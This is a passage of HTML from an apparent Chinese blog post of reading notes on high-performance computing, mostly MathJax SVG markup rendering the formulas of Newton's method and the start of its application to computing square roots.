-10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container></span> 更接近根。</p>
<img lazyload="" src="/images/loading.svg" data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/newton.png" class="">
<p>为了得到交点 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.471ex;" xmlns="http://www.w3.org/2000/svg" width="4.078ex" height="1.471ex" role="img" focusable="false" viewBox="0 -442 1802.6 650"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></g></svg></mjx-container></span>，我们需要将切线函数设为零： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="28.376ex" height="2.396ex" role="img" focusable="false" viewBox="0 -809 12542.4 1059"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(777.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(1833.6,0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(2383.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(2772.6,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(3671.5,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(4282.7,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mo" transform="translate(5283,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(5672,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(7696.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msub" transform="translate(8697,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(9596,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="msup" transform="translate(9985,0)"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(636,413) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g><g data-mml-node="mo" transform="translate(10865.4,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(11254.4,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(12153.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span> 从中我们可以推导出牛顿法的迭代公式： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.172ex;" xmlns="http://www.w3.org/2000/svg" width="18.676ex" height="5.475ex" role="img" focusable="false" viewBox="0 -1460 8255 2420"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(2080.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(3136.2,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(4257.4,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mfrac" transform="translate(5257.6,0)"><g data-mml-node="mrow" transform="translate(385.2,710)"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(939,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1838,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mrow" transform="translate(220,-710)"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(636,289) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g><g data-mml-node="mo" transform="translate(880.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(1269.5,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(2168.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><rect width="2757.4" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container></span> 牛顿法非常重要，它是许多科学与工程中的优化求解器的基础。</p>
<h5 id="平方根的牛顿法求解">平方根的牛顿法求解</h5>
<p>首先，假设我们要解的是方程： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="45.561ex" height="2.581ex" role="img" focusable="false" viewBox="0 -890.8 20137.9 1140.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(849.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msqrt" transform="translate(1905.6,0)"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 